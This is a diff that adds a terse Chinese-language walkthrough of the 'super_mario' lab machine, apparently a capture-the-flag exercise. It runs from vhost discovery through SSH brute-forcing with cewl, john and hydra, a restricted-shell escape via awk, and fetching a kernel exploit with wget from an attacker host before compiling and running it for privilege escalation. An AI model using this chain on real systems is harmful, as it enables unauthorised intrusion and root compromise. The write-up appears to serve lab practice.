@@ -1,2 +1,47 @@
 super_mario
 
+目标主机IP：192.168.100.157
+
+扫描发现目标开放了22,8180端口；
+
+http://192.168.100.157:8180/vhosts
+
+ServerName mario.supermariohost.local
+
+http://mario.supermariohost.local:8180/luigi.php
+
+Hey!! It'sa Luiiiggiii!!
+My short brother doesn't know that I'm wandering around his host and messing around, he's new with computers!
+Since I'm here I want to tell you more about myself...my brother is a nice person but we are in love for the same person: Princess Peach! I hope she will find out about this.
+I Love Peach
+Forever yours,
+Luigi
+
+
+cewl http://mario.supermariohost.local:8180/luigi.php/ >dict.txt
+
+john --wordlist=dict.txt --stdout --rules > passwd
+
+hydra -L dict.txt -P passwd ssh://192.168.100.157
+	[22][ssh] host: 192.168.100.157   login: luigi   password: luigi1
+	
+
+ssh luigi@192.168.100.157
+成功获取shell，但是限制shell交互；
+help命令查看靶机支持的命令；
+能使用awk命令，awk调用shell命令有两种方法，system与print；
+
+awk 'BEGIN{system("/bin/bash")}'
+
+成功获取了交互式的shell；接下来就需要提权；
+
+uname -a
+	Linux supermariohost 3.13.0-32-generic
+
+searchsploit Ubuntu 14.04
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) -  | linux/local/37292.c
+
+cd /tmp
+wget 192.168.100.143/37292.c
+gcc -pthread 37292.c -o exp -lcrypt  
+./exp
